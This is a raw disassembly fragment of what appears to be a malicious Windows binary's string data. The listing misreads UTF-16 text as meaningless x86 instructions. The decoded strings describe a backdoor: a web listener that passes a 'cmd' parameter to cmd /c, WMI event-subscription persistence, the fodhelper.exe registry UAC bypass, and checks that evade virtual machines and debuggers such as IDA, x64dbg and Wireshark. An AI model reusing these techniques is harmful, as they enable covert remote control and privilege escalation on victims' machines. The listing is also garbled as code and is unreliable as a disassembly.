  409bc2:	72 00                	jb     0x409bc4
  409bc4:	00 27                	add    %ah,(%edi)
  409bc6:	43                   	inc    %ebx
  409bc7:	00 6f 00             	add    %ch,0x0(%edi)
  409bca:	6d                   	insl   (%dx),%es:(%edi)
  409bcb:	00 6d 00             	add    %ch,0x0(%ebp)
  409bce:	61                   	popa
  409bcf:	00 6e 00             	add    %ch,0x0(%esi)
  409bd2:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  409bd7:	00 6e 00             	add    %ch,0x0(%esi)
  409bda:	65 00 54 00 65       	add    %dl,%gs:0x65(%eax,%eax,1)
  409bdf:	00 6d 00             	add    %ch,0x0(%ebp)
  409be2:	70 00                	jo     0x409be4
  409be4:	6c                   	insb   (%dx),%es:(%edi)
  409be5:	00 61 00             	add    %ah,0x0(%ecx)
  409be8:	74 00                	je     0x409bea
  409bea:	65 00 00             	add    %al,%gs:(%eax)
  409bed:	33 5f 00             	xor    0x0(%edi),%ebx
  409bf0:	5f                   	pop    %edi
  409bf1:	00 46 00             	add    %al,0x0(%esi)
  409bf4:	69 00 6c 00 74 00    	imul   $0x74006c,(%eax),%eax
  409bfa:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409bfe:	54                   	push   %esp
  409bff:	00 6f 00             	add    %ch,0x0(%edi)
  409c02:	43                   	inc    %ebx
  409c03:	00 6f 00             	add    %ch,0x0(%edi)
  409c06:	6e                   	outsb  %ds:(%esi),(%dx)
  409c07:	00 73 00             	add    %dh,0x0(%ebx)
  409c0a:	75 00                	jne    0x409c0c
  409c0c:	6d                   	insl   (%dx),%es:(%edi)
  409c0d:	00 65 00             	add    %ah,0x0(%ebp)
  409c10:	72 00                	jb     0x409c12
  409c12:	42                   	inc    %edx
  409c13:	00 69 00             	add    %ch,0x0(%ecx)
  409c16:	6e                   	outsb  %ds:(%esi),(%dx)
  409c17:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  409c1b:	00 6e 00             	add    %ch,0x0(%esi)
  409c1e:	67 00 00             	add    %al,(%bx,%si)
  409c21:	0d 46 00 69 00       	or     $0x690046,%eax
  409c26:	6c                   	insb   (%dx),%es:(%edi)
  409c27:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409c2b:	00 72 00             	add    %dh,0x0(%edx)
  409c2e:	00 11                	add    %dl,(%ecx)
  409c30:	43                   	inc    %ebx
  409c31:	00 6f 00             	add    %ch,0x0(%edi)
  409c34:	6e                   	outsb  %ds:(%esi),(%dx)
  409c35:	00 73 00             	add    %dh,0x0(%ebx)
  409c38:	75 00                	jne    0x409c3a
  409c3a:	6d                   	insl   (%dx),%es:(%edi)
  409c3b:	00 65 00             	add    %ah,0x0(%ebp)
  409c3e:	72 00                	jb     0x409c40
  409c40:	00 1d 68 00 74 00    	add    %bl,0x740068
  409c46:	74 00                	je     0x409c48
  409c48:	70 00                	jo     0x409c4a
  409c4a:	3a 00                	cmp    (%eax),%al
  409c4c:	2f                   	das
  409c4d:	00 2f                	add    %ch,(%edi)
  409c4f:	00 2b                	add    %ch,(%ebx)
  409c51:	00 3a                	add    %bh,(%edx)
  409c53:	00 38                	add    %bh,(%eax)
  409c55:	00 30                	add    %dh,(%eax)
  409c57:	00 38                	add    %bh,(%eax)
  409c59:	00 30                	add    %dh,(%eax)
  409c5b:	00 2f                	add    %ch,(%edi)
  409c5d:	00 00                	add    %al,(%eax)
  409c5f:	07                   	pop    %es
  409c60:	63 00                	arpl   %eax,(%eax)
  409c62:	6d                   	insl   (%dx),%es:(%edi)
  409c63:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  409c67:	33 4e 00             	xor    0x0(%esi),%ecx
  409c6a:	6f                   	outsl  %ds:(%esi),(%dx)
  409c6b:	00 20                	add    %ah,(%eax)
  409c6d:	00 27                	add    %ah,(%edi)
  409c6f:	00 63 00             	add    %ah,0x0(%ebx)
  409c72:	6d                   	insl   (%dx),%es:(%edi)
  409c73:	00 64 00 27          	add    %ah,0x27(%eax,%eax,1)
  409c77:	00 20                	add    %ah,(%eax)
  409c79:	00 70 00             	add    %dh,0x0(%eax)
  409c7c:	61                   	popa
  409c7d:	00 72 00             	add    %dh,0x0(%edx)
  409c80:	61                   	popa
  409c81:	00 6d 00             	add    %ch,0x0(%ebp)
  409c84:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  409c89:	00 72 00             	add    %dh,0x0(%edx)
  409c8c:	20 00                	and    %al,(%eax)
  409c8e:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  409c92:	76 00                	jbe    0x409c94
  409c94:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409c98:	2e 00 01             	add    %al,%cs:(%ecx)
  409c9b:	15 74 00 65 00       	adc    $0x650074,%eax
  409ca0:	78 00                	js     0x409ca2
  409ca2:	74 00                	je     0x409ca4
  409ca4:	2f                   	das
  409ca5:	00 70 00             	add    %dh,0x0(%eax)
  409ca8:	6c                   	insb   (%dx),%es:(%edi)
  409ca9:	00 61 00             	add    %ah,0x0(%ecx)
  409cac:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  409cb2:	2f                   	das
  409cb3:	00 63 00             	add    %ah,0x0(%ebx)
  409cb6:	20 00                	and    %al,(%eax)
  409cb8:	00 33                	add    %dh,(%ebx)
  409cba:	45                   	inc    %ebp
  409cbb:	00 72 00             	add    %dh,0x0(%edx)
  409cbe:	72 00                	jb     0x409cc0
  409cc0:	6f                   	outsl  %ds:(%esi),(%dx)
  409cc1:	00 72 00             	add    %dh,0x0(%edx)
  409cc4:	20 00                	and    %al,(%eax)
  409cc6:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  409cca:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409cce:	75 00                	jne    0x409cd0
  409cd0:	74 00                	je     0x409cd2
  409cd2:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409cd8:	20 00                	and    %al,(%eax)
  409cda:	63 00                	arpl   %eax,(%eax)
  409cdc:	6f                   	outsl  %ds:(%esi),(%dx)
  409cdd:	00 6d 00             	add    %ch,0x0(%ebp)
  409ce0:	6d                   	insl   (%dx),%es:(%edi)
  409ce1:	00 61 00             	add    %ah,0x0(%ecx)
  409ce4:	6e                   	outsb  %ds:(%esi),(%dx)
  409ce5:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  409ce9:	00 20                	add    %ah,(%eax)
  409ceb:	00 00                	add    %al,(%eax)
  409ced:	5f                   	pop    %edi
  409cee:	53                   	push   %ebx
  409cef:	00 6f 00             	add    %ch,0x0(%edi)
  409cf2:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  409cf7:	00 61 00             	add    %ah,0x0(%ecx)
  409cfa:	72 00                	jb     0x409cfc
  409cfc:	65 00 5c 00 43       	add    %bl,%gs:0x43(%eax,%eax,1)
  409d01:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  409d05:	00 73 00             	add    %dh,0x0(%ebx)
  409d08:	73 00                	jae    0x409d0a
  409d0a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409d0e:	5c                   	pop    %esp
  409d0f:	00 6d 00             	add    %ch,0x0(%ebp)
  409d12:	73 00                	jae    0x409d14
  409d14:	2d 00 73 00 65       	sub    $0x65007300,%eax
  409d19:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  409d1d:	00 69 00             	add    %ch,0x0(%ecx)
  409d20:	6e                   	outsb  %ds:(%esi),(%dx)
  409d21:	00 67 00             	add    %ah,0x0(%edi)
  409d24:	73 00                	jae    0x409d26
  409d26:	5c                   	pop    %esp
  409d27:	00 73 00             	add    %dh,0x0(%ebx)
  409d2a:	68 00 65 00 6c       	push   $0x6c006500
  409d2f:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  409d33:	00 6f 00             	add    %ch,0x0(%edi)
  409d36:	70 00                	jo     0x409d38
  409d38:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409d3c:	5c                   	pop    %esp
  409d3d:	00 63 00             	add    %ah,0x0(%ebx)
  409d40:	6f                   	outsl  %ds:(%esi),(%dx)
  409d41:	00 6d 00             	add    %ch,0x0(%ebp)
  409d44:	6d                   	insl   (%dx),%es:(%edi)
  409d45:	00 61 00             	add    %ah,0x0(%ecx)
  409d48:	6e                   	outsb  %ds:(%esi),(%dx)
  409d49:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  409d4d:	1f                   	pop    %ds
  409d4e:	44                   	inc    %esp
  409d4f:	00 65 00             	add    %ah,0x0(%ebp)
  409d52:	6c                   	insb   (%dx),%es:(%edi)
  409d53:	00 65 00             	add    %ah,0x0(%ebp)
  409d56:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  409d5a:	74 00                	je     0x409d5c
  409d5c:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  409d60:	78 00                	js     0x409d62
  409d62:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409d66:	75 00                	jne    0x409d68
  409d68:	74 00                	je     0x409d6a
  409d6a:	65 00 00             	add    %al,%gs:(%eax)
  409d6d:	1b 66 00             	sbb    0x0(%esi),%esp
  409d70:	6f                   	outsl  %ds:(%esi),(%dx)
  409d71:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  409d75:	00 65 00             	add    %ah,0x0(%ebp)
  409d78:	6c                   	insb   (%dx),%es:(%edi)
  409d79:	00 70 00             	add    %dh,0x0(%eax)
  409d7c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409d80:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409d84:	78 00                	js     0x409d86
  409d86:	65 00 00             	add    %al,%gs:(%eax)
  409d89:	45                   	inc    %ebp
  409d8a:	53                   	push   %ebx
  409d8b:	00 65 00             	add    %ah,0x0(%ebp)
  409d8e:	6c                   	insb   (%dx),%es:(%edi)
  409d8f:	00 65 00             	add    %ah,0x0(%ebp)
  409d92:	63 00                	arpl   %eax,(%eax)
  409d94:	74 00                	je     0x409d96
  409d96:	20 00                	and    %al,(%eax)
  409d98:	2a 00                	sub    (%eax),%al
  409d9a:	20 00                	and    %al,(%eax)
  409d9c:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409da0:	6f                   	outsl  %ds:(%esi),(%dx)
  409da1:	00 6d 00             	add    %ch,0x0(%ebp)
  409da4:	20 00                	and    %al,(%eax)
  409da6:	57                   	push   %edi
  409da7:	00 69 00             	add    %ch,0x0(%ecx)
  409daa:	6e                   	outsb  %ds:(%esi),(%dx)
  409dab:	00 33                	add    %dh,(%ebx)
  409dad:	00 32                	add    %dh,(%edx)
  409daf:	00 5f 00             	add    %bl,0x0(%edi)
  409db2:	43                   	inc    %ebx
  409db3:	00 6f 00             	add    %ch,0x0(%edi)
  409db6:	6d                   	insl   (%dx),%es:(%edi)
  409db7:	00 70 00             	add    %dh,0x0(%eax)
  409dba:	75 00                	jne    0x409dbc
  409dbc:	74 00                	je     0x409dbe
  409dbe:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409dc2:	53                   	push   %ebx
  409dc3:	00 79 00             	add    %bh,0x0(%ecx)
  409dc6:	73 00                	jae    0x409dc8
  409dc8:	74 00                	je     0x409dca
  409dca:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409dce:	00 19                	add    %bl,(%ecx)
  409dd0:	4d                   	dec    %ebp
  409dd1:	00 61 00             	add    %ah,0x0(%ecx)
  409dd4:	6e                   	outsb  %ds:(%esi),(%dx)
  409dd5:	00 75 00             	add    %dh,0x0(%ebp)
  409dd8:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409ddc:	63 00                	arpl   %eax,(%eax)
  409dde:	74 00                	je     0x409de0
  409de0:	75 00                	jne    0x409de2
  409de2:	72 00                	jb     0x409de4
  409de4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409de8:	00 0b                	add    %cl,(%ebx)
  409dea:	4d                   	dec    %ebp
  409deb:	00 6f 00             	add    %ch,0x0(%edi)
  409dee:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409df2:	6c                   	insb   (%dx),%es:(%edi)
  409df3:	00 00                	add    %al,(%eax)
  409df5:	80 87 53 00 59 00 53 	addb   $0x53,0x590053(%edi)
  409dfc:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  409e00:	00 4d 00             	add    %cl,0x0(%ebp)
  409e03:	5c                   	pop    %esp
  409e04:	00 43 00             	add    %al,0x0(%ebx)
  409e07:	75 00                	jne    0x409e09
  409e09:	72 00                	jb     0x409e0b
  409e0b:	72 00                	jb     0x409e0d
  409e0d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409e11:	74 00                	je     0x409e13
  409e13:	43                   	inc    %ebx
  409e14:	00 6f 00             	add    %ch,0x0(%edi)
  409e17:	6e                   	outsb  %ds:(%esi),(%dx)
  409e18:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  409e1c:	00 6f 00             	add    %ch,0x0(%edi)
  409e1f:	6c                   	insb   (%dx),%es:(%edi)
  409e20:	00 53 00             	add    %dl,0x0(%ebx)
  409e23:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
  409e28:	00 43 00             	add    %al,0x0(%ebx)
  409e2b:	6f                   	outsl  %ds:(%esi),(%dx)
  409e2c:	00 6e 00             	add    %ch,0x0(%esi)
  409e2f:	74 00                	je     0x409e31
  409e31:	72 00                	jb     0x409e33
  409e33:	6f                   	outsl  %ds:(%esi),(%dx)
  409e34:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  409e38:	00 53 00             	add    %dl,0x0(%ebx)
  409e3b:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409e3f:	73 00                	jae    0x409e41
  409e41:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409e47:	20 00                	and    %al,(%eax)
  409e49:	4d                   	dec    %ebp
  409e4a:	00 61 00             	add    %ah,0x0(%ecx)
  409e4d:	6e                   	outsb  %ds:(%esi),(%dx)
  409e4e:	00 61 00             	add    %ah,0x0(%ecx)
  409e51:	67 00 65 00          	add    %ah,0x0(%di)
  409e55:	72 00                	jb     0x409e57
  409e57:	5c                   	pop    %esp
  409e58:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  409e5c:	00 62 00             	add    %ah,0x0(%edx)
  409e5f:	75 00                	jne    0x409e61
  409e61:	67 00 20             	add    %ah,(%bx,%si)
  409e64:	00 50 00             	add    %dl,0x0(%eax)
  409e67:	72 00                	jb     0x409e69
  409e69:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  409e6f:	20 00                	and    %al,(%eax)
  409e71:	46                   	inc    %esi
  409e72:	00 69 00             	add    %ch,0x0(%ecx)
  409e75:	6c                   	insb   (%dx),%es:(%edi)
  409e76:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409e7a:	00 72 00             	add    %dh,0x0(%edx)
  409e7d:	00 0f                	add    %cl,(%edi)
  409e7f:	44                   	inc    %esp
  409e80:	00 65 00             	add    %ah,0x0(%ebp)
  409e83:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409e87:	75 00                	jne    0x409e89
  409e89:	6c                   	insb   (%dx),%es:(%edi)
  409e8a:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  409e8e:	03 3a                	add    (%edx),%edi
  409e90:	00 00                	add    %al,(%eax)
  409e92:	3b 53 00             	cmp    0x0(%ebx),%edx
  409e95:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  409e9a:	00 63 00             	add    %ah,0x0(%ebx)
  409e9d:	74 00                	je     0x409e9f
  409e9f:	20 00                	and    %al,(%eax)
  409ea1:	2a 00                	sub    (%eax),%al
  409ea3:	20 00                	and    %al,(%eax)
  409ea5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409ea9:	6f                   	outsl  %ds:(%esi),(%dx)
  409eaa:	00 6d 00             	add    %ch,0x0(%ebp)
  409ead:	20 00                	and    %al,(%eax)
  409eaf:	57                   	push   %edi
  409eb0:	00 69 00             	add    %ch,0x0(%ecx)
  409eb3:	6e                   	outsb  %ds:(%esi),(%dx)
  409eb4:	00 33                	add    %dh,(%ebx)
  409eb6:	00 32                	add    %dh,(%edx)
  409eb8:	00 5f 00             	add    %bl,0x0(%edi)
  409ebb:	50                   	push   %eax
  409ebc:	00 6e 00             	add    %ch,0x0(%esi)
  409ebf:	50                   	push   %eax
  409ec0:	00 45 00             	add    %al,0x0(%ebp)
  409ec3:	6e                   	outsb  %ds:(%esi),(%dx)
  409ec4:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409ec8:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409ecc:	00 00                	add    %al,(%eax)
  409ece:	17                   	pop    %ss
  409ecf:	44                   	inc    %esp
  409ed0:	00 65 00             	add    %ah,0x0(%ebp)
  409ed3:	73 00                	jae    0x409ed5
  409ed5:	63 00                	arpl   %eax,(%eax)
  409ed7:	72 00                	jb     0x409ed9
  409ed9:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409edf:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409ee5:	00 0f                	add    %cl,(%edi)
  409ee7:	76 00                	jbe    0x409ee9
  409ee9:	69 00 72 00 74 00    	imul   $0x740072,(%eax),%eax
  409eef:	75 00                	jne    0x409ef1
  409ef1:	61                   	popa
  409ef2:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  409ef6:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  409efb:	77 00                	ja     0x409efd
  409efd:	61                   	popa
  409efe:	00 72 00             	add    %dh,0x0(%edx)
  409f01:	65 00 00             	add    %al,%gs:(%eax)
  409f04:	09 76 00             	or     %esi,0x0(%esi)
  409f07:	62 00                	bound  %eax,(%eax)
  409f09:	6f                   	outsl  %ds:(%esi),(%dx)
  409f0a:	00 78 00             	add    %bh,0x0(%eax)
  409f0d:	00 0f                	add    %cl,(%edi)
  409f0f:	68 00 79 00 70       	push   $0x70007900
  409f14:	00 65 00             	add    %ah,0x0(%ebp)
  409f17:	72 00                	jb     0x409f19
  409f19:	2d 00 76 00 01       	sub    $0x1007600,%eax
  409f1e:	09 71 00             	or     %esi,0x0(%ecx)
  409f21:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409f25:	75 00                	jne    0x409f27
  409f27:	00 69 53             	add    %ch,0x53(%ecx)
  409f2a:	00 65 00             	add    %ah,0x0(%ebp)
  409f2d:	6c                   	insb   (%dx),%es:(%edi)
  409f2e:	00 65 00             	add    %ah,0x0(%ebp)
  409f31:	63 00                	arpl   %eax,(%eax)
  409f33:	74 00                	je     0x409f35
  409f35:	20 00                	and    %al,(%eax)
  409f37:	54                   	push   %esp
  409f38:	00 6f 00             	add    %ch,0x0(%edi)
  409f3b:	74 00                	je     0x409f3d
  409f3d:	61                   	popa
  409f3e:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  409f42:	00 68 00             	add    %ch,0x0(%eax)
  409f45:	79 00                	jns    0x409f47
  409f47:	73 00                	jae    0x409f49
  409f49:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
  409f4f:	6c                   	insb   (%dx),%es:(%edi)
  409f50:	00 4d 00             	add    %cl,0x0(%ebp)
  409f53:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409f57:	6f                   	outsl  %ds:(%esi),(%dx)
  409f58:	00 72 00             	add    %dh,0x0(%edx)
  409f5b:	79 00                	jns    0x409f5d
  409f5d:	20 00                	and    %al,(%eax)
  409f5f:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409f63:	6f                   	outsl  %ds:(%esi),(%dx)
  409f64:	00 6d 00             	add    %ch,0x0(%ebp)
  409f67:	20 00                	and    %al,(%eax)
  409f69:	57                   	push   %edi
  409f6a:	00 69 00             	add    %ch,0x0(%ecx)
  409f6d:	6e                   	outsb  %ds:(%esi),(%dx)
  409f6e:	00 33                	add    %dh,(%ebx)
  409f70:	00 32                	add    %dh,(%edx)
  409f72:	00 5f 00             	add    %bl,0x0(%edi)
  409f75:	43                   	inc    %ebx
  409f76:	00 6f 00             	add    %ch,0x0(%edi)
  409f79:	6d                   	insl   (%dx),%es:(%edi)
  409f7a:	00 70 00             	add    %dh,0x0(%eax)
  409f7d:	75 00                	jne    0x409f7f
  409f7f:	74 00                	je     0x409f81
  409f81:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409f85:	53                   	push   %ebx
  409f86:	00 79 00             	add    %bh,0x0(%ecx)
  409f89:	73 00                	jae    0x409f8b
  409f8b:	74 00                	je     0x409f8d
  409f8d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409f91:	00 27                	add    %ah,(%edi)
  409f93:	54                   	push   %esp
  409f94:	00 6f 00             	add    %ch,0x0(%edi)
  409f97:	74 00                	je     0x409f99
  409f99:	61                   	popa
  409f9a:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  409f9e:	00 68 00             	add    %ch,0x0(%eax)
  409fa1:	79 00                	jns    0x409fa3
  409fa3:	73 00                	jae    0x409fa5
  409fa5:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
  409fab:	6c                   	insb   (%dx),%es:(%edi)
  409fac:	00 4d 00             	add    %cl,0x0(%ebp)
  409faf:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  409fb4:	00 72 00             	add    %dh,0x0(%edx)
  409fb7:	79 00                	jns    0x409fb9
  409fb9:	00 67 53             	add    %ah,0x53(%edi)
  409fbc:	00 65 00             	add    %ah,0x0(%ebp)
  409fbf:	6c                   	insb   (%dx),%es:(%edi)
  409fc0:	00 65 00             	add    %ah,0x0(%ebp)
  409fc3:	63 00                	arpl   %eax,(%eax)
  409fc5:	74 00                	je     0x409fc7
  409fc7:	20 00                	and    %al,(%eax)
  409fc9:	4e                   	dec    %esi
  409fca:	00 75 00             	add    %dh,0x0(%ebp)
  409fcd:	6d                   	insl   (%dx),%es:(%edi)
  409fce:	00 62 00             	add    %ah,0x0(%edx)
  409fd1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409fd5:	4f                   	dec    %edi
  409fd6:	00 66 00             	add    %ah,0x0(%esi)
  409fd9:	50                   	push   %eax
  409fda:	00 72 00             	add    %dh,0x0(%edx)
  409fdd:	6f                   	outsl  %ds:(%esi),(%dx)
  409fde:	00 63 00             	add    %ah,0x0(%ebx)
  409fe1:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409fe5:	73 00                	jae    0x409fe7
  409fe7:	6f                   	outsl  %ds:(%esi),(%dx)
  409fe8:	00 72 00             	add    %dh,0x0(%edx)
  409feb:	73 00                	jae    0x409fed
  409fed:	20 00                	and    %al,(%eax)
  409fef:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409ff3:	6f                   	outsl  %ds:(%esi),(%dx)
  409ff4:	00 6d 00             	add    %ch,0x0(%ebp)
  409ff7:	20 00                	and    %al,(%eax)
  409ff9:	57                   	push   %edi
  409ffa:	00 69 00             	add    %ch,0x0(%ecx)
  409ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  409ffe:	00 33                	add    %dh,(%ebx)
  40a000:	00 32                	add    %dh,(%edx)
  40a002:	00 5f 00             	add    %bl,0x0(%edi)
  40a005:	43                   	inc    %ebx
  40a006:	00 6f 00             	add    %ch,0x0(%edi)
  40a009:	6d                   	insl   (%dx),%es:(%edi)
  40a00a:	00 70 00             	add    %dh,0x0(%eax)
  40a00d:	75 00                	jne    0x40a00f
  40a00f:	74 00                	je     0x40a011
  40a011:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a015:	53                   	push   %ebx
  40a016:	00 79 00             	add    %bh,0x0(%ecx)
  40a019:	73 00                	jae    0x40a01b
  40a01b:	74 00                	je     0x40a01d
  40a01d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a021:	00 25 4e 00 75 00    	add    %ah,0x75004e
  40a027:	6d                   	insl   (%dx),%es:(%edi)
  40a028:	00 62 00             	add    %ah,0x0(%edx)
  40a02b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a02f:	4f                   	dec    %edi
  40a030:	00 66 00             	add    %ah,0x0(%esi)
  40a033:	50                   	push   %eax
  40a034:	00 72 00             	add    %dh,0x0(%edx)
  40a037:	6f                   	outsl  %ds:(%esi),(%dx)
  40a038:	00 63 00             	add    %ah,0x0(%ebx)
  40a03b:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a03f:	73 00                	jae    0x40a041
  40a041:	6f                   	outsl  %ds:(%esi),(%dx)
  40a042:	00 72 00             	add    %dh,0x0(%edx)
  40a045:	73 00                	jae    0x40a047
  40a047:	00 0f                	add    %cl,(%edi)
  40a049:	6f                   	outsl  %ds:(%esi),(%dx)
  40a04a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a04e:	00 79 00             	add    %bh,0x0(%ecx)
  40a051:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a055:	67 00 00             	add    %al,(%bx,%si)
  40a058:	0b 69 00             	or     0x0(%ecx),%ebp
  40a05b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a05f:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a063:	00 07                	add    %al,(%edi)
  40a065:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  40a06b:	00 09                	add    %cl,(%ecx)
  40a06d:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  40a073:	67 00 00             	add    %al,(%bx,%si)
  40a076:	09 69 00             	or     %ebp,0x0(%ecx)
  40a079:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a07d:	77 00                	ja     0x40a07f
  40a07f:	00 0d 69 00 64 00    	add    %cl,0x640069
  40a085:	61                   	popa
  40a086:	00 77 00             	add    %dh,0x0(%edi)
  40a089:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a08d:	00 09                	add    %cl,(%ecx)
  40a08f:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  40a095:	71 00                	jno    0x40a097
  40a097:	00 0d 69 00 64 00    	add    %cl,0x640069
  40a09d:	61                   	popa
  40a09e:	00 71 00             	add    %dh,0x0(%ecx)
  40a0a1:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a0a5:	00 13                	add    %dl,(%ebx)
  40a0a7:	77 00                	ja     0x40a0a9
  40a0a9:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40a0af:	73 00                	jae    0x40a0b1
  40a0b1:	68 00 61 00 72       	push   $0x72006100
  40a0b6:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0b9:	00 0f                	add    %cl,(%edi)
  40a0bb:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a0bf:	64 00 64 00 6c       	add    %ah,%fs:0x6c(%eax,%eax,1)
  40a0c4:	00 65 00             	add    %ah,0x0(%ebp)
  40a0c7:	72 00                	jb     0x40a0c9
  40a0c9:	00 0d 78 00 36 00    	add    %cl,0x360078
  40a0cf:	34 00                	xor    $0x0,%al
  40a0d1:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a0d5:	67 00 00             	add    %al,(%bx,%si)
  40a0d8:	0d 78 00 33 00       	or     $0x330078,%eax
  40a0dd:	32 00                	xor    (%eax),%al
  40a0df:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a0e3:	67 00 00             	add    %al,(%bx,%si)
  40a0e6:	11 64 00 65          	adc    %esp,0x65(%eax,%eax,1)
  40a0ea:	00 62 00             	add    %ah,0x0(%edx)
  40a0ed:	75 00                	jne    0x40a0ef
  40a0ef:	67 00 67 00          	add    %ah,0x0(%bx)
  40a0f3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a0f7:	00 0f                	add    %cl,(%edi)
  40a0f9:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a0fd:	67 00 76 00          	add    %dh,0x0(%bp)
  40a101:	69 00 65 00 77 00    	imul   $0x770065,(%eax),%eax
  40a107:	00 1b                	add    %bl,(%ebx)
  40a109:	70 00                	jo     0x40a10b
  40a10b:	72 00                	jb     0x40a10d
  40a10d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a10e:	00 63 00             	add    %ah,0x0(%ebx)
  40a111:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a115:	73 00                	jae    0x40a117
  40a117:	68 00 61 00 63       	push   $0x63006100
  40a11c:	00 6b 00             	add    %ch,0x0(%ebx)
  40a11f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a123:	00 0f                	add    %cl,(%edi)
  40a125:	70 00                	jo     0x40a127
  40a127:	72 00                	jb     0x40a129
  40a129:	6f                   	outsl  %ds:(%esi),(%dx)
  40a12a:	00 63 00             	add    %ah,0x0(%ebx)
  40a12d:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40a131:	70 00                	jo     0x40a133
  40a133:	00 0f                	add    %cl,(%edi)
  40a135:	70 00                	jo     0x40a137
  40a137:	72 00                	jb     0x40a139
  40a139:	6f                   	outsl  %ds:(%esi),(%dx)
  40a13a:	00 63 00             	add    %ah,0x0(%ebx)
  40a13d:	6d                   	insl   (%dx),%es:(%edi)
  40a13e:	00 6f 00             	add    %ch,0x0(%edi)
  40a141:	6e                   	outsb  %ds:(%esi),(%dx)
  40a142:	00 00                	add    %al,(%eax)
  40a144:	0d 64 00 65 00       	or     $0x650064,%eax
  40a149:	76 00                	jbe    0x40a14b
